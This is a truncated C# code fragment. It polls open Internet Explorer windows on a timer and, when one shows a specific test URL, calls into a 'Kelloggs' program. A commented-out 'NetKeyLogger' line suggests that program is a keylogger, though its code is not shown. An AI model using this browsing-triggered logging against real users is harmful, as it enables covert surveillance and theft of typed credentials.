    class wait
    {
        private static System.Timers.Timer aTimer;
       public  void timed1()
        {
            // Create a timer with a ten second interval.
            aTimer = new System.Timers.Timer(10000);
            // Hook up the Elapsed event for the timer.
            aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            // Set the Interval to 2 seconds (2000 milliseconds).
            aTimer.Interval = 2000;
            aTimer.Enabled = true;
            Console.WriteLine("Press the Enter key to exit the program.");
            Console.ReadLine();
        }
        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            //NetKeyLogger klog = new NetKeyLogger();
            // Console.WriteLine("The Elapsed event was raised at {0}", e.SignalTime);
            Kelloggs.Program KKA = new Kelloggs.Program();
            SHDocVw.ShellWindows shellWindows = new SHDocVw.ShellWindows();
            string filename;
            foreach (SHDocVw.InternetExplorer ie in shellWindows)
            {
                filename = Path.GetFileNameWithoutExtension(ie.FullName).ToLower();
                if (filename.Equals("iexplore"))
                {
                    string ddd = (ie.LocationURL);
                    // Console.WriteLine(ddd);
                    if (ie.LocationURL == "http://www.testPage.com/")
                    {
                        Console.WriteLine("Page found");
                        // Console.ReadLine();
                        aTimer.Enabled = false;
                        KKA.Maino();
                    }
                }
            
